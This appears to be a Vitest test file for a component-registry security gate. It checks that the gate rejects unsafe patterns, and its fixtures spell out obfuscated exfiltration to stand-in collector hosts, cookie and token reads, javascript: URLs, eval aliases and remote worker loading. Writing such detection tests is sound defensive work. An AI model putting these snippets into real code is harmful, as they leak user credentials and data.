import { describe, it, expect } from 'vitest';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as ts from 'typescript';
import { ResourceManifestSchema } from '@tessellate/schemas';
import {
  runRegistryGate,
  checkTokenHygiene,
  checkAccessibilityGate,
  checkResponsiveGate,
  checkReducedMotionGate,
  checkSecurityIsolationGate,
  checkBundleBudgetGate,
  checkLicenseProvenanceGate,
} from '../index.js';

describe('Phase 18 — @tessellate/registry-gate Test Suite', () => {
  const repoRoot = path.resolve(__dirname, '../../../..');
  const buttonDir = path.join(repoRoot, 'resources/primitives/button');

  it('runs complete quality gate audit on canonical button primitive and passes', async () => {
    const report = await runRegistryGate(buttonDir);

    expect(report.resourceSlug).toBe('button');
    expect(report.resourceName).toBe('Button');
    expect(report.overallStatus).toBe('approved');
    expect(report.failedChecks).toBe(0);
    expect(report.totalScore).toBeGreaterThanOrEqual(90);
    expect(report.markdownReport).toContain('STATIC CHECKS PASSED — READY FOR HUMAN REVIEW');
    expect(report.checks).toHaveLength(8);
    expect(report.markdownReport).toContain('8-Check');
    expect(report.summary).toMatch(/human review and runtime certification are still required/i);
  });

  it('rejects a nested outbound request even when it appears in a test-named file', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-nested-network-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      fs.writeFileSync(
        path.join(tempDir, 'index.tsx'),
        'export function SafeButton() { return <button className="w-full focus-visible:ring-2">Save</button>; }',
        'utf-8'
      );
      const nestedSource = path.join(tempDir, 'src', 'remote.test.tsx');
      fs.mkdirSync(path.dirname(nestedSource), { recursive: true });
      fs.writeFileSync(
        nestedSource,
        'export function leak() { fetch("https://collector.invalid", { method: "POST" }); }',
        'utf-8'
      );

      const report = await runRegistryGate(tempDir);
      const isolation = report.checks.find((check) => check.id === 'security-isolation');
      expect(isolation?.status).toBe('fail');
      expect(isolation?.details).toMatch(/outbound|network/i);
      expect(report.overallStatus).toBe('rejected');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects a statically aliased remote asset through the contribution gate', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-remote-asset-alias-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      fs.writeFileSync(
        path.join(tempDir, 'index.tsx'),
        [
          'const collector = "https://collector.invalid";',
          'const beacon = collector + "/pixel";',
          'export function RemoteAsset() { return <img src={beacon} alt="" />; }',
        ].join('\n'),
        'utf-8'
      );

      const report = await runRegistryGate(tempDir);
      const isolation = report.checks.find((check) => check.id === 'security-isolation');
      expect(isolation?.status).toBe('fail');
      expect(isolation?.details).toMatch(/remote asset|outbound|network/i);
      expect(report.overallStatus).toBe('rejected');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects a statically aliased remote SVG image reference', () => {
    const result = checkSecurityIsolationGate(`
      const remoteIcon = 'https://assets.invalid/icon.svg';
      export function RemoteIcon() {
        return <svg><image href={remoteIcon} /></svg>;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/remote asset|outbound|network/i);
  });

  it('scans uppercase TSX extensions for aliased remote assets', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-uppercase-tsx-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      const code = [
        'const tracker = "https://collector.invalid/pixel";',
        'export function Tracker() { return <img src={tracker} alt="" />; }',
      ].join('\n');
      fs.writeFileSync(path.join(tempDir, 'index.TSX'), code, 'utf-8');

      const direct = checkSecurityIsolationGate(code, [], [{ fileName: 'index.TSX', code }]);
      expect(direct.status, `direct uppercase TSX scan: ${JSON.stringify(direct)}`).toBe('fail');

      const report = await runRegistryGate(tempDir);
      expect(
        report.checks.find((check) => check.id === 'security-isolation')?.status,
        `registry report: ${JSON.stringify(report.checks.find((check) => check.id === 'security-isolation'))}`
      ).toBe('fail');
      expect(report.overallStatus).toBe('rejected');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it.skipIf(!ts.sys.useCaseSensitiveFileNames)(
    'fails closed when Linux source extensions collide after TypeScript normalization',
    () => {
      const untrustedSource = [
        'const tracker = "https://collector.invalid/pixel";',
        'export function Tracker() { return <img src={tracker} alt="" />; }',
      ].join('\n');
      const safeSource = 'export function Safe() { return <div />; }';
      const result = checkSecurityIsolationGate(
        `${untrustedSource}\n${safeSource}`,
        [],
        [
          { fileName: 'index.TSX', code: untrustedSource },
          { fileName: 'index.tsx', code: safeSource },
        ]
      );

      expect(result.status).toBe('fail');
      expect(result.details).toMatch(/source filenames collide|safely certified/i);
    }
  );

  it('resolves remote asset aliases imported from another resource source file', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-cross-file-alias-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      fs.writeFileSync(
        path.join(tempDir, 'asset-url.ts'),
        'export const trackingPixel = "https://collector.invalid/pixel";',
        'utf-8'
      );
      fs.writeFileSync(
        path.join(tempDir, 'index.tsx'),
        [
          'import { trackingPixel } from "./asset-url.js";',
          'export function TrackingPixel() { return <img src={trackingPixel} alt="" />; }',
        ].join('\n'),
        'utf-8'
      );

      const report = await runRegistryGate(tempDir);
      expect(report.checks.find((check) => check.id === 'security-isolation')?.status).toBe('fail');
      expect(report.overallStatus).toBe('rejected');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects static remote URLs assigned to browser-created media elements', () => {
    const result = checkSecurityIsolationGate(`
      const beacon = 'https://collector.invalid/pixel';
      const image = new Image();
      image.src = beacon;
      const audio = new Audio(beacon);
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/remote asset|outbound|network/i);
  });

  it('rejects remote URLs that start loading in the Image constructor', () => {
    const result = checkSecurityIsolationGate(`
      const trackingPixel = 'https://collector.invalid/pixel';
      const pixel = new Image(trackingPixel);
      const ImageConstructor = window['Image'];
      const aliasedPixel = new ImageConstructor(trackingPixel);
      const directWindowPixel = new window.Image(trackingPixel);
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/remote asset|outbound|network/i);

    const localAsset = checkSecurityIsolationGate(`new Image('/assets/brand-mark.svg');`);
    expect(localAsset.status).toBe('pass');
  });

  it('rejects remote image requests through a destructured Image constructor', () => {
    const result = checkSecurityIsolationGate(`
      const browserWindow = window;
      const { Image: BrowserImage } = browserWindow;
      const pixel = new BrowserImage('https://collector.invalid/pixel');
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/remote asset|outbound|network/i);
  });

  it('rejects a remote form submission target', () => {
    const result = checkSecurityIsolationGate(`
      const submitEndpoint = 'https://collector.invalid/submit';
      export function ContactForm() {
        return <form action={submitEndpoint} method="post"><input name="email" /></form>;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/outbound|network/i);

    const submitter = checkSecurityIsolationGate(`
      const submitEndpoint = 'https://collector.invalid/submit';
      export function ContactForm() {
        return <form><button formAction={submitEndpoint}>Send</button></form>;
      }
    `);
    expect(submitter.status).toBe('fail');
  });

  it('rejects statically declared and dynamically imported remote modules', () => {
    const staticImport = checkSecurityIsolationGate(
      `import remoteComponent from 'https://modules.invalid/component.js';`
    );
    const dynamicImport = checkSecurityIsolationGate(`
      const moduleUrl = 'https://modules.invalid/runtime.js';
      void import(moduleUrl);
    `);

    expect(staticImport.status).toBe('fail');
    expect(staticImport.details).toMatch(/module|outbound|network/i);
    expect(dynamicImport.status).toBe('fail');
    expect(dynamicImport.details).toMatch(/module|outbound|network/i);
  });

  it('rejects a remote URL object used as a resource asset', () => {
    const result = checkSecurityIsolationGate(`
      const source = new URL('https:' + '//assets.invalid/hero.webp');
      export function Hero() { return <img src={source.href} alt="" />; }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/remote asset|outbound|network/i);
  });

  it('does not exclude runtime files whose names merely contain the word test', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-filename-filter-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      fs.writeFileSync(
        path.join(tempDir, 'index.tsx'),
        'export function SafeButton() { return <button className="w-full focus-visible:ring-2">Save</button>; }',
        'utf-8'
      );
      fs.writeFileSync(
        path.join(tempDir, 'contest.tsx'),
        'export function ContestButton() { return <div onClick={() => submit()}>Submit</div>; }',
        'utf-8'
      );

      const report = await runRegistryGate(tempDir);
      expect(report.checks.find((check) => check.id === 'accessibility-audit')?.status).toBe(
        'fail'
      );
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects unsafe iframe embeds and credential reads', () => {
    const res = checkSecurityIsolationGate(`
      export function UnsafeEmbed() {
        const token = localStorage.getItem('auth_token');
        return <iframe src="https://collector.invalid/frame" />;
      }
    `);

    expect(res.status).toBe('fail');
    expect(res.details).toMatch(/iframe/i);
    expect(res.details).toMatch(/credential|storage|token/i);
  });

  it('rejects direct, aliased, computed, and reflected browser credential storage access', () => {
    const cases = [
      `document['coo' + 'kie'];`,
      `const { cookie: value } = document; void value;`,
      `globalThis['local' + 'Storage'].getItem('auth_token');`,
      `const storage = window['localStorage']; storage.getItem('api_key');`,
      `const { localStorage: storage } = window; storage.getItem('secret');`,
      `Reflect.get(document, 'cookie');`,
      `Reflect.get(globalThis, 'localStorage').getItem('token');`,
      `Object.getOwnPropertyDescriptor(document, 'cookie')?.get?.call(document);`,
      `Object.getOwnPropertyDescriptor(Document.prototype, 'cookie')?.get?.call(document);`,
      `const read = Reflect.get; const cookie = read(document, 'cookie');`,
      `const descriptor = Object.getOwnPropertyDescriptor(document, 'cookie'); descriptor?.get?.call(document);`,
      `navigator.credentials.get({ password: true });`,
      `const { credentials } = navigator; credentials.get({ password: true });`,
      `Reflect.get(navigator, 'credentials').get({ password: true });`,
      `cookieStore.get('session');`,
      `indexedDB.open('tessellate');`,
      `const database = window['indexedDB']; database.open('tessellate');`,
      `Reflect.get(globalThis, 'caches').match('/private');`,
      `Reflect.set(document, 'cookie', 'session=secret');`,
      `Object.defineProperty(document, 'cookie', { value: 'session=secret' });`,
      `Reflect.defineProperty(globalThis, 'localStorage', { value: fakeStorage });`,
      `Object.assign(document, { cookie: 'session=secret' });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/credential|cookie|storage/i);
    }

    expect(
      checkSecurityIsolationGate(`Object.defineProperty(document, 'title', { value: 'Preview' });`)
        .status
    ).toBe('pass');
    expect(
      checkSecurityIsolationGate(`Object.assign(document, { title: 'Preview' });`).status
    ).toBe('pass');
  });

  it('does not reject external navigation links or local asset aliases', () => {
    const result = checkSecurityIsolationGate(`
      const destination = 'https://docs.example.test/guide';
      const icon = '/assets/icon.svg';
      export function SafeLinks() {
        return <><a href={destination}>Read the guide</a><img src={icon} alt="" /></>;
      }
    `);

    expect(result.status).toBe('pass');
  });

  it('allows a URL object used only for external navigation', () => {
    const result = checkSecurityIsolationGate(`
      const destination = new URL('https://docs.example.test/guide');
      export function GuideLink() {
        return <a href={destination.href}>Read the guide</a>;
      }
    `);

    expect(result.status).toBe('pass');
  });

  it('allows semantic external navigation through a capitalized Link component', () => {
    const result = checkSecurityIsolationGate(`
      export function ExternalLink() {
        return <Link href="https://docs.example.test/guide">Read the guide</Link>;
      }
    `);

    expect(result.status).toBe('pass');
  });

  it('rejects executable URL schemes in navigation attributes', () => {
    const result = checkSecurityIsolationGate(`
      export function UnsafeLink() {
        return <a href="javascript:alert(1)">Open account</a>;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects executable URL schemes resolved through a static alias', () => {
    const result = checkSecurityIsolationGate(`
      const scheme = 'java' + 'script:';
      const destination = scheme + 'alert(1)';
      export function UnsafeLink() {
        return <a href={destination}>Open account</a>;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects executable URL schemes with browser-stripped newlines', () => {
    const source = String.raw`
      const destination = 'java\nscript:alert(1)';
      export function UnsafeLink() {
        return <a href={destination}>Open account</a>;
      }
    `;
    const result = checkSecurityIsolationGate(source);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects executable URLs passed to browser navigation methods', () => {
    const result = checkSecurityIsolationGate(`
      const destination = 'java' + 'script:alert(1)';
      window.location.assign(destination);
      window.location.replace('javascript:alert(2)');
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects executable navigation through bare and aliased location references', () => {
    const result = checkSecurityIsolationGate(`
      const destination = 'java' + 'script:alert(1)';
      const navigation = window.location;
      navigation.assign(destination);
      location = 'javascript:alert(2)';
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects executable navigation through mutable and computed location references', () => {
    const result = checkSecurityIsolationGate(`
      const destination = 'java' + 'script:alert(1)';
      let navigation = window.location;
      navigation.assign(destination);
      window['location'].assign(destination);
      window.location['replace'](destination);
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/executable|unsafe.*scheme|javascript/i);
  });

  it('rejects direct and aliased document.write sinks', () => {
    const result = checkSecurityIsolationGate(`
      const hostDocument = window.document;
      document.write(markup);
      hostDocument.writeln(markup);
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/document\.write|markup writing/i);
  });

  it('rejects outbound requests through a static fetch alias', () => {
    const result = checkSecurityIsolationGate(`
      const request = fetch;
      const windowRequest = window['fetch'];
      const boundRequest = fetch.bind(window);
      request('https://collector.invalid/pixel');
      windowRequest('https://collector.invalid/pixel');
      boundRequest('https://collector.invalid/pixel');
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/outbound|network/i);
  });

  it('rejects outbound requests through a destructured fetch alias', () => {
    const result = checkSecurityIsolationGate(`
      const browserWindow = window;
      const { fetch: sendRequest } = browserWindow;
      sendRequest('https://collector.invalid/pixel');
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/outbound|network/i);
  });

  it('rejects network constructors invoked through static aliases', () => {
    const result = checkSecurityIsolationGate(`
      const Socket = WebSocket;
      const Stream = EventSource;
      const Request = XMLHttpRequest;
      new Socket('wss://collector.invalid/live');
      new Stream('https://collector.invalid/events');
      new Request();
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/outbound|network/i);
  });

  it('rejects aliased browser and HTTP client network APIs', () => {
    const constructorResult = checkSecurityIsolationGate(`
      const browserWindow = window;
      const { WebSocket: Socket } = browserWindow;
      new Socket('wss://collector.invalid/live');
    `);
    expect(constructorResult.status).toBe('fail');

    const beaconResult = checkSecurityIsolationGate(`
      const browserNavigator = navigator;
      const { sendBeacon: beacon } = browserNavigator;
      beacon('https://collector.invalid/pixel', 'data');
    `);
    expect(beaconResult.status).toBe('fail');

    const axiosResult = checkSecurityIsolationGate(`
      const getRequest = axios.get;
      getRequest('https://collector.invalid/data');
    `);
    expect(axiosResult.status).toBe('fail');

    const axiosInstanceResult = checkSecurityIsolationGate(`
      const client = axios.create();
      client.get('https://collector.invalid/data');
    `);
    expect(axiosInstanceResult.status).toBe('fail');
  });

  it('rejects reflected access to browser network APIs', () => {
    const cases = [
      `const request = Reflect.get(window, 'fetch'); request('https://collector.invalid/data');`,
      `Reflect.apply(window.fetch, window, ['https://collector.invalid/data']);`,
      `const request = Object.getOwnPropertyDescriptor(window, 'fetch')?.value; request('https://collector.invalid/data');`,
      `Reflect['get'](globalThis, 'fetch')('https://collector.invalid/data');`,
      `const reflection = Reflect; const lookup = reflection.get; lookup(window, 'fetch');`,
      `const { apply: invoke } = Reflect; invoke(fetch, globalThis, ['https://collector.invalid/data']);`,
      `const describeProperty = Object.getOwnPropertyDescriptor; describeProperty(globalThis, 'fetch');`,
      `Reflect.construct(WebSocket, ['wss://collector.invalid/live']);`,
      `const construct = Reflect.construct; construct(EventSource, ['https://collector.invalid/events']);`,
      `Reflect.construct(Image, ['https://collector.invalid/pixel.png']);`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects computed browser API names and unresolved dynamic sinks', () => {
    const cases = [
      `window["fe" + "tch"]('https://collector.invalid/data');`,
      `const method = "fetch"; globalThis[method]('https://collector.invalid/data');`,
      `new window["Wor" + "ker"]('https://collector.invalid/worker.js');`,
      `new window["Fun" + "ction"]('return 1');`,
      `document["wri" + "te"]('<img src=https://collector.invalid/pixel>');`,
      `window["set" + "Timeout"]('sendSecret()', 0);`,
      `const image = document.createElement('img'); image["s" + "rc"] = 'https://collector.invalid/pixel.png';`,
      `const image = document.createElement('img'); const attribute = 'src'; image[attribute] = 'https://collector.invalid/pixel.png';`,
      `const element = document["create" + "Element"]('img'); element.src = 'https://collector.invalid/pixel.png';`,
      `const create = document.createElement; const element = create('img'); element.src = 'https://collector.invalid/pixel.png';`,
      `const create = document["createElement"]; const element = create('img'); element.src = 'https://collector.invalid/pixel.png';`,
      `const request = window[enabled ? 'fetch' : 'clearTimeout']; request('https://collector.invalid/data');`,
      `const image = document.createElement('img'); image[enabled ? 'src' : 'alt'] = 'https://collector.invalid/pixel.png';`,
      `const api = window[getApiName()]; api('https://collector.invalid/data');`,
      `const element = document.createElement('img'); element[getAttributeName()] = 'https://collector.invalid/pixel.png';`,
      `window[getApiName()]('https://collector.invalid/data');`,
      `const constructor = window[getApiName()]; new constructor('https://collector.invalid/worker.js');`,
      `const element = document.createElement('img'); element[getMethodName()]('src', 'https://collector.invalid/pixel.png');`,
      `Reflect.get(window, getApiName())('https://collector.invalid/data');`,
      `const api = Reflect.get(window, getApiName()); api('https://collector.invalid/data');`,
      `Reflect.apply(Reflect.get(window, getApiName()), window, ['https://collector.invalid/data']);`,
      `Object.getOwnPropertyDescriptor(window, getApiName())?.value('https://collector.invalid/data');`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status, source).toBe('fail');
    }
  });

  it('rejects dynamic code execution through aliases and reflection', () => {
    const cases = [
      `const execute = eval; execute('alert(1)');`,
      `const DynamicFunction = Function; new DynamicFunction('return 1');`,
      `Reflect.apply(eval, undefined, ['alert(1)']);`,
      `Reflect.construct(Function, ['return 1'])();`,
      `Reflect.get(globalThis, 'Function')('return 1')();`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects remote resource URLs assigned through DOM mutation APIs', () => {
    const cases = [
      `document.createElement('img').setAttribute('src', 'https://collector.invalid/pixel.png');`,
      `Reflect.set(document.createElement('img'), 'src', 'https://collector.invalid/pixel.png');`,
      `Object.defineProperty(document.createElement('img'), 'src', { value: 'https://collector.invalid/pixel.png' });`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects reflective DOM markup injection sinks', () => {
    const cases = [
      `Reflect.apply(document.write, document, ['<b>unsafe</b>']);`,
      `Reflect.set(document.body, 'innerHTML', userText);`,
      `Object.defineProperty(document.body, 'outerHTML', { value: userText });`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects executable and active-document URLs assigned through reflection', () => {
    const cases = [
      `Reflect.set(location, 'href', 'javascript:alert(1)');`,
      `Object.defineProperty(location, 'href', { value: 'data:text/html,<script>1</script>' });`,
      `Reflect.apply(location.assign, location, ['javascript:alert(1)']);`,
      `Reflect.set(document.createElement('iframe'), 'src', 'data:text/html,<script>1</script>');`,
      `Object.defineProperty(document.createElement('a'), 'href', { value: 'javascript:alert(1)' });`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects remote worker and service-worker code loading', () => {
    const cases = [
      `new Worker('https://collector.invalid/worker.js');`,
      `const MakeWorker = SharedWorker; new MakeWorker('https://collector.invalid/shared.js');`,
      `navigator.serviceWorker.register('https://collector.invalid/service-worker.js');`,
      `const register = navigator.serviceWorker.register; register('https://collector.invalid/service-worker.js');`,
      `importScripts('https://collector.invalid/worker.js');`,
      `const loadScripts = importScripts; loadScripts('https://collector.invalid/worker.js');`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects reflected worker and service-worker code loading', () => {
    const cases = [
      `Reflect.construct(Reflect.get(window, 'Worker'), ['https://collector.invalid/worker.js']);`,
      `Reflect.apply(Reflect.get(navigator.serviceWorker, 'register'), navigator.serviceWorker, ['https://collector.invalid/service-worker.js']);`,
      `const apply = Reflect.apply; apply(importScripts, self, ['https://collector.invalid/worker.js']);`,
      `const get = Reflect.get; const makeWorker = get(window, 'SharedWorker'); new makeWorker('https://collector.invalid/shared.js');`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
  });

  it('rejects string-based timer code execution', () => {
    const cases = [
      `setTimeout('fetch("https://collector.invalid/data")', 0);`,
      `window.setInterval('globalThis.tessellateProbe = true', 1000);`,
      `const schedule = window.setTimeout; schedule('globalThis.tessellateProbe = true', 0);`,
      `Reflect.apply(window.setTimeout, window, ['globalThis.tessellateProbe = true', 0]);`,
    ];

    for (const source of cases) {
      expect(checkSecurityIsolationGate(source).status).toBe('fail');
    }
    expect(
      checkSecurityIsolationGate(`window.setTimeout(() => console.info('ready'), 0);`).status
    ).not.toBe('fail');
  });

  it('rejects active HTML documents embedded from data URLs', () => {
    const result = checkSecurityIsolationGate(`
      export function EmbeddedDocument() {
        return <iframe sandbox="" src="data:text/html,untrusted content" />;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/active-document/i);
  });

  it('allows safe external anchors but rejects remote programmatic navigation', () => {
    const result = checkSecurityIsolationGate(`
      export function SafeLinks() {
        return <nav>
          <a href="#features">Features</a>
          <a href="https://docs.example.test/guide">Guide</a>
        </nav>;
      }
    `);

    expect(result.status).toBe('pass');

    expect(
      checkSecurityIsolationGate(
        `Reflect.apply(location.assign, location, ['https://docs.example.test/guide']);`
      ).status
    ).toBe('fail');
  });

  it('rejects programmatic navigation when a resource can place user data in the destination', () => {
    const result = checkSecurityIsolationGate(`
      export function UnsafeRedirect() {
        const value = document.querySelector('input')?.value ?? '';
        function send() {
          window.location.assign('https://collector.example.test/?value=' + encodeURIComponent(value));
        }
        return <button onClick={send}>Continue</button>;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/programmatic navigation/i);
  });

  it('rejects programmatic popup navigation through direct, aliased, and reflected access', () => {
    const sources = [
      `window.open(destination, '_blank', 'noopener');`,
      `window.open('https://collector.invalid/collect', '_blank', 'noopener');`,
      `window['o' + 'pen'](destination);`,
      `const openExternal = window.open; openExternal(destination);`,
      `const { open: openExternal } = window; openExternal(destination);`,
      `window.open.call(window, destination);`,
      `Reflect.apply(window.open, window, [destination]);`,
      `const popup = Reflect.get(window, 'open'); Reflect.apply(popup, window, [destination]);`,
      `open(destination);`,
    ];

    for (const source of sources) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/programmatic navigation/i);
    }

    expect(checkSecurityIsolationGate(`window.open('#details', '_self');`).status).toBe('pass');
  });

  it('rejects scripted activation of an external anchor carrying resource data', () => {
    const sources = [
      `
        const value = 'sample employee data';
        const anchor = document.createElement('a');
        anchor.href = 'https://collector.invalid/collect?value=' + encodeURIComponent(value);
        anchor.click();
      `,
      `
        const anchor = document.createElement('a');
        const target = anchor;
        target.setAttribute('href', destination);
        anchor.click();
      `,
      `
        const anchor = document.createElement('a');
        anchor.href = 'https://collector.invalid/collect';
        anchor.click();
      `,
      `
        const anchor = document.createElement('a');
        anchor.setAttribute();
        anchor.click();
      `,
      `
        const anchor = document.createElement('a');
        anchor.href = destination;
        const activate = anchor.click;
        activate();
      `,
      `
        const anchor = document.createElement('a');
        anchor.href = destination;
        const { click: activate } = anchor;
        activate();
      `,
      `
        const anchor = document.createElement('a');
        anchor.href = destination;
        Reflect.apply(anchor.click, anchor, []);
      `,
      `
        const anchor = document.createElement('a');
        anchor.href = destination;
        const activate = Reflect.get(anchor, 'click');
        Reflect.apply(activate, anchor, []);
      `,
    ];

    for (const source of sources) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/programmatic navigation/i);
    }

    expect(
      checkSecurityIsolationGate(`
        const anchor = document.createElement('a');
        anchor.href = '#details';
        anchor.click();
      `).status
    ).toBe('pass');
  });

  it('allows fragment-only location changes but rejects unresolved destinations', () => {
    expect(checkSecurityIsolationGate(`location.assign('#details');`).status).toBe('pass');

    const result = checkSecurityIsolationGate(`
      function continueTo(destination: string) {
        location.replace(destination);
      }
    `);
    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/programmatic navigation/i);

    expect(checkSecurityIsolationGate(`location.href = destination;`).details).toMatch(
      /programmatic navigation/i
    );
    expect(checkSecurityIsolationGate(`Reflect.set(location, 'href', destination);`).details).toMatch(
      /programmatic navigation/i
    );
    expect(
      checkSecurityIsolationGate(`Object.defineProperty(location, 'href', { value: destination });`)
        .details
    ).toMatch(/programmatic navigation/i);
    expect(checkSecurityIsolationGate(`Object.assign(location, { href: destination });`).details).toMatch(
      /programmatic navigation/i
    );
  });

  it('does not treat an ordinary space inside a URL-like label as an executable scheme', () => {
    const result = checkSecurityIsolationGate(`
      export function SafeLink() {
        return <a href="java script: an ordinary label">Read the note</a>;
      }
    `);

    expect(result.status).toBe('pass');
  });

  it('rejects clickable non-semantic elements that cannot be used reliably from a keyboard', () => {
    const result = checkAccessibilityGate('<div onClick={() => openPanel()}>Open settings</div>');

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/role="button"|tabIndex/i);
  });

  it('rejects undeclared-risk dependencies listed only in the manifest', () => {
    const result = checkBundleBudgetGate('', 1024, [
      { package: 'moment', range: '*', kind: 'runtime' },
    ]);

    expect(result.status).toBe('fail');
    expect(result.details).toContain('moment');
  });

  it('rejects unbounded runtime dependency declarations', () => {
    const dependencies = Array.from({ length: 9 }, (_, index) => ({
      package: `small-package-${index}`,
      range: '^1.0.0',
      kind: 'runtime' as const,
    }));
    const result = checkBundleBudgetGate('', 1024, dependencies);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/runtime dependenc/i);
  });

  it('accepts the documented dependency and source-size ceilings and rejects the next byte', () => {
    const maxDependencies = Array.from({ length: 8 }, (_, index) => ({
      package: `small-package-${index}`,
      range: '^1.0.0',
      kind: 'runtime' as const,
    }));
    expect(checkBundleBudgetGate('', 50 * 1024, maxDependencies).status).toBe('pass');
    expect(checkBundleBudgetGate('', 50 * 1024 + 1, maxDependencies).status).toBe('fail');
  });

  it('rejects resources whose source exceeds the safe scan limit', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-large-source-'));
    try {
      fs.copyFileSync(path.join(buttonDir, 'manifest.json'), path.join(tempDir, 'manifest.json'));
      fs.writeFileSync(path.join(tempDir, 'index.tsx'), `// ${'x'.repeat(1024 * 1024)}`, 'utf-8');

      const report = await runRegistryGate(tempDir);
      const isolation = report.checks.find((check) => check.id === 'security-isolation');
      const bundle = report.checks.find((check) => check.id === 'bundle-budget');
      expect(isolation?.status).toBe('fail');
      expect(isolation?.details).toMatch(/safe inspection limits/i);
      expect(bundle?.status).toBe('fail');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects unverified redistribution and mismatched license metadata', () => {
    const canonical = ResourceManifestSchema.parse(
      JSON.parse(fs.readFileSync(path.join(buttonDir, 'manifest.json'), 'utf-8'))
    );
    const unverified = checkLicenseProvenanceGate({
      ...canonical,
      license: { ...canonical.license, redistributionVerified: false },
    });
    const mismatchedName = checkLicenseProvenanceGate({
      ...canonical,
      license: { ...canonical.license, name: 'Proprietary License' },
    });
    const undocumentedDerivative = checkLicenseProvenanceGate({
      ...canonical,
      provenance: { ...canonical.provenance, derivative: true },
    });
    const unknownProvenance = checkLicenseProvenanceGate({
      ...canonical,
      provenance: { origin: 'unknown', derivative: 'unknown', aiAssistance: 'unknown' },
    });
    const blankCreator = checkLicenseProvenanceGate({
      ...canonical,
      creator: { ...canonical.creator, displayName: '   ' },
    });

    expect(unverified.status).toBe('fail');
    expect(unverified.details).toMatch(/redistribution/i);
    expect(mismatchedName.status).toBe('fail');
    expect(mismatchedName.details).toMatch(/name.*SPDX|SPDX.*name/i);
    expect(undocumentedDerivative.status).toBe('fail');
    expect(undocumentedDerivative.details).toMatch(/derivative|source/i);
    expect(unknownProvenance.status).toBe('fail');
    expect(unknownProvenance.details).toMatch(/provenance.*reviewed/i);
    expect(blankCreator.status).toBe('fail');
    expect(blankCreator.details).toMatch(/creator identity/i);
  });

  it('correctly catches hardcoded colors in token hygiene check', () => {
    const badCode = `
      export function BadCard() {
        return <div className="bg-[#123456] text-[#FFFFFF] p-[17px]">Hello</div>;
      }
    `;
    const res = checkTokenHygiene(badCode);
    expect(res.status).toBe('fail');
    expect(res.details).toContain('unapproved arbitrary color');
    expect(res.remediation).toBeDefined();
  });

  it('correctly catches security violations (eval, dangerouslySetInnerHTML)', () => {
    const dangerousCode = `
